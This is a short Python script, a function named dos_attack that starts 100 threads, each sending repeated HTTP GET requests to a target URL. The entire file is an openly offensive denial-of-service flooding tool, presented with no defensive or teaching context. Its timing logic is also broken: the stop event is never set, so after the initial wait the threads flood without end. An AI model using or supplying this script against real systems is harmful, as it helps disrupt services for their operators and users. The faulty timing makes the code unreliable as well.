import requests
import threading

def dos_attack(target_url, duration):
    def attack():
        end_time = threading.Event()
        end_time.wait(duration)
        while not end_time.is_set():
            try:
                requests.get(target_url)
                print(f"Request sent to {target_url}")
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {e}")

    threads = []
    for _ in range(100):  # Number of threads
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()